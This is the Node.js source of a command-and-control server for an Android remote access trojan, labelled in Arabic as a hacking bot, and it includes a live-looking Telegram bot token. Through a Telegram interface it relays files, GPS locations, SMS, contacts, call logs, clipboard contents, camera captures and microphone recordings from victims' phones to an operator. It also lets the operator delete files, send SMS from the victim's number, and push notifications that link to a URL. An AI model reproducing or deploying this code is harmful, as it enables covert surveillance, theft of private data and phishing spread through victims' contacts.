const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

// الإعدادات الأساسية
const token = '7707628884:AAFP6nZf7tMrVrzcIRC3xaojzQjb6D3OEM8'
const id = '8128490926'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

// متغير للتحكم في حالة الإشعارات (إفتراضياً تعمل)
let notificationsEnabled = true; 

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

// الصفحة الرئيسية للسيرفر
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @Y_F_HK</h1>')
})

// استقبال الملفات من التطبيق
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    if (notificationsEnabled) {
        appBot.sendDocument(id, req.file.buffer, {
            caption: `°• رسالة من<b>${req.headers.model}</b> جهاز`,
            parse_mode: "HTML"
        }, {
            filename: name,
            contentType: 'application/txt',
        })
    }
    res.send('')
})

app.post("/uploadText", (req, res) => {
    if (notificationsEnabled) {
        appBot.sendMessage(id, `°• رسالة من<b>${req.headers.model}</b> جهاز\n\n` + req.body['text'], {parse_mode: "HTML"})
    }
    res.send('')
})

app.post("/uploadLocation", (req, res) => {
    if (notificationsEnabled) {
        appBot.sendLocation(id, req.body['lat'], req.body['lon'])
        appBot.sendMessage(id, `°• موقع من <b>${req.headers.model}</b> جهاز`, {parse_mode: "HTML"})
    }
    res.send('')
})

// إدارة اتصالات WebSocket
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model, battery: battery, version: version, brightness: brightness, provider: provider
    })

    if (notificationsEnabled) {
        appBot.sendMessage(id,
            `°• جهاز📱 جديد متصل\n\n` +
            `• موديل الجهاز : <b>${model}</b>\n` +
            `• البطارية🔋 : <b>${battery}</b>\n` +
            `• نظام الاندرويد : <b>${version}</b>\n` +
            `• سطوح الشاشة : <b>${brightness}</b>\n` +
            `• مزود : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
    }

    ws.on('close', function () {
        if (notificationsEnabled) {
            appBot.sendMessage(id,
                `°• لا يوجد❌️ جهاز متصل\n\n` +
                `• موديل الجهاز : <b>${model}</b>\n` +
                `• البطارية : <b>${battery}</b>`,
                {parse_mode: "HTML"}
            )
        }
        appClients.delete(ws.uuid)
    })
})

// إدارة رسائل تليجرام
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    const text = message.text;

    if (id == chatId) {
        // الأوامر الثابتة الجديدة
        if (text === 'إيقاف الإشعارات 🔕') {
            notificationsEnabled = false;
            return appBot.sendMessage(id, '⚠️ تم إيقاف إشعارات دخول وخروج الأجهزة.');
        }

        if (text === 'تشغيل الإشعارات 🔔') {
            notificationsEnabled = true;
            return appBot.sendMessage(id, '✅ تم تشغيل الإشعارات بنجاح.');
        }

        if (text === '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت 𓆪𓆪𓅓𝙼𝚁.𝙳𝙰𝚁𝙺 𓅓𓆪𓆪 𖤛ᴠɪᴘ\n\n' +
                '• استخدم الأزرار الثابتة بالأسفل للتحكم:',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["الاجهزة المتصلة", "تنفيذ الامر"],
                            ["تشغيل الإشعارات 🔔", "إيقاف الإشعارات 🔕"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (text === 'الاجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• لا توجد اجهزة متصلة')
            } else {
                let statusMsg = notificationsEnabled ? "🔔 تعمل" : "🔕 متوقفة";
                let textOut = `°• قائمة الاجهزة المتصلة (الإشعارات: ${statusMsg}) :\n\n`
                appClients.forEach((value) => {
                    textOut += `• موديل الجهاز : <b>${value.model}</b>\n` +
                               `• البطارية 🔋: <b>${value.battery}</b>\n\n`
                })
                appBot.sendMessage(id, textOut, {parse_mode: "HTML"})
            }
        }

        if (text === 'تنفيذ الامر') {
            if (appClients.size == 0) {
                appBot.sendMessage(id, '°• لا توجد اجهزة متصلة')
            } else {
                const deviceListKeyboard = []
                appClients.forEach((value, key) => {
                    deviceListKeyboard.push([{ text: value.model, callback_data: 'device:' + key }])
                })
                appBot.sendMessage(id, '°• حدد الجهاز المراد تنفيذ عليه الاوامر', {
                    "reply_markup": { "inline_keyboard": deviceListKeyboard }
                })
            }
        }

        // معالجة الردود (Force Reply)
        if (message.reply_to_message) {
            const replyText = message.reply_to_message.text;
            
            if (replyText.includes('كتابة رقم الذي تريد ارسال الية')) {
                currentNumber = message.text
                appBot.sendMessage(id, '°• جيد الان قم بكتابة الرسالة المراد ارسالها...', {reply_markup: {force_reply: true}})
            }
            else if (replyText.includes('الرسالة المراد ارسالها من جهاز الضحية الئ الرقم')) {
                appSocket.clients.forEach(ws => { if (ws.uuid == currentUuid) ws.send(`send_message:${currentNumber}/${message.text}`) });
                appBot.sendMessage(id, '°• طلبك قيد المعالجة...');
            }
            else if (replyText.includes('الرسالة المراد ارسالها الئ الجميع')) {
                appSocket.clients.forEach(ws => { if (ws.uuid == currentUuid) ws.send(`send_message_to_all:${message.text}`) });
                appBot.sendMessage(id, '°• جاري الإرسال للجميع...');
            }
            else if (replyText.includes('ادخل مسار الملف الذي تريد سحبة')) {
                appSocket.clients.forEach(ws => { if (ws.uuid == currentUuid) ws.send(`file:${message.text}`) });
                appBot.sendMessage(id, '°• جاري سحب الملف...');
            }
            else if (replyText.includes('ادخل مسار الملف الذي تريد \n\n')) { // حذف ملف
                appSocket.clients.forEach(ws => { if (ws.uuid == currentUuid) ws.send(`delete_file:${message.text}`) });
                appBot.sendMessage(id, '°• جاري حذف الملف...');
            }
            else if (replyText.includes('المدة الذي تريد تسجيل صوت')) {
                appSocket.clients.forEach(ws => { if (ws.uuid == currentUuid) ws.send(`microphone:${message.text}`) });
                appBot.sendMessage(id, '°• جاري تسجيل الصوت...');
            }
            else if (replyText.includes('الرسالة التي تريد ان تظهر علئ جهاز الضحية')) {
                appSocket.clients.forEach(ws => { if (ws.uuid == currentUuid) ws.send(`toast:${message.text}`) });
                appBot.sendMessage(id, '°• تم إرسال التنبيه (Toast)...');
            }
            else if (replyText.includes('أدخل رابط الصوت الذي تريد تشغيله')) {
                appSocket.clients.forEach(ws => { if (ws.uuid == currentUuid) ws.send(`play_audio:${message.text}`) });
                appBot.sendMessage(id, '°• جاري تشغيل الصوت...');
            }
            // إشعار مخصص
            else if (replyText.includes('الرسالة التي تريدها تظهر كما إشعار')) {
                currentTitle = message.text
                appBot.sendMessage(id, '°• أدخل الرابط الذي سيفتح عند النقر على الإشعار', {reply_markup: {force_reply: true}})
            }
            else if (replyText.includes('أدخل الرابط الذي سيفتح عند النقر')) {
                appSocket.clients.forEach(ws => { if (ws.uuid == currentUuid) ws.send(`show_notification:${currentTitle}/${message.text}`) });
                appBot.sendMessage(id, '°• تم إرسال الإشعار...');
            }
        }
    }
});

// قائمة التحكم بالأجهزة (Inline Buttons)
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const [command, uuid] = data.split(':');

    if (command === 'device') {
        appBot.editMessageText(`°• حدد الأمر للجهاز : <b>${appClients.get(uuid).model}</b>`, {
            chat_id: id,
            message_id: msg.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{text: 'التطبيقات', callback_data: `apps:${uuid}`}, {text: 'معلومات الجهاز', callback_data: `device_info:${uuid}`}],
                    [{text: 'سحب ملف', callback_data: `file:${uuid}`}, {text: 'حذف ملف', callback_data: `delete_file:${uuid}`}],
                    [{text: 'المكروفون 🎙', callback_data: `microphone:${uuid}`}, {text: 'الحافظة 📋', callback_data: `clipboard:${uuid}`}],
                    [{text: 'كاميرا أمامية 📷', callback_data: `camera_main:${uuid}`}, {text: 'كاميرا سيلفي 📸', callback_data: `camera_selfie:${uuid}`}],
                    [{text: 'الموقع 📍', callback_data: `location:${uuid}`}, {text: 'إرسال Toast', callback_data: `toast:${uuid}`}],
                    [{text: 'المكالمات ☎️', callback_data: `calls:${uuid}`}, {text: 'جهات الاتصال 📞', callback_data: `contacts:${uuid}`}],
                    [{text: 'الرسائل 📩', callback_data: `messages:${uuid}`}, {text: 'إرسال SMS', callback_data: `send_message:${uuid}`}],
                    [{text: 'تشغيل صوت 🎶', callback_data: `play_audio:${uuid}`}, {text: 'إيقاف الصوت 🔇', callback_data: `stop_audio:${uuid}`}],
                    [{text: 'إرسال إشعار 🔔', callback_data: `show_notification:${uuid}`}],
                    [{text: 'رسالة للجميع ✉️', callback_data: `send_message_to_all:${uuid}`}]
                ]
            }
        });
    } else {
        // تنفيذ الأوامر المباشرة
        const directCommands = ['calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard', 'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio'];
        if (directCommands.includes(command)) {
            appSocket.clients.forEach(ws => { if (ws.uuid == uuid) ws.send(command) });
            appBot.sendMessage(id, '°• جاري تنفيذ الأمر المباشر...');
        }
        
        // الأوامر التي تحتاج مدخلات
        if (command === 'send_message') {
            appBot.sendMessage(id, '°• الرجاء كتابة رقم الذي تريد ارسال الية من رقم الضحية', {reply_markup: {force_reply: true}});
            currentUuid = uuid;
        }
        if (command === 'file') {
            appBot.sendMessage(id, '°• ادخل مسار الملف الذي تريد سحبة (مثال: DCIM/Camera)', {reply_markup: {force_reply: true}});
            currentUuid = uuid;
        }
        if (command === 'microphone') {
            appBot.sendMessage(id, '°• ادخل المدة بالثواني لتسجيل الصوت', {reply_markup: {force_reply: true}});
            currentUuid = uuid;
        }
        if (command === 'toast') {
            appBot.sendMessage(id, '°• ادخل الرسالة التي تريد ان تظهر على الشاشة', {reply_markup: {force_reply: true}});
            currentUuid = uuid;
        }
        if (command === 'show_notification') {
            appBot.sendMessage(id, '°• ادخل الرسالة التي تريدها تظهر كما إشعار', {reply_markup: {force_reply: true}});
            currentUuid = uuid;
        }
        if (command === 'play_audio') {
            appBot.sendMessage(id, '°• أدخل رابط الصوت المباشر (Direct Link)', {reply_markup: {force_reply: true}});
            currentUuid = uuid;
        }
    }
});

// نظام الحفاظ على الاتصال
setInterval(() => {
    appSocket.clients.forEach(ws => ws.send('ping'));
    axios.get(address).catch(() => {});
}, 5000)

appServer.listen(process.env.PORT || 8999);
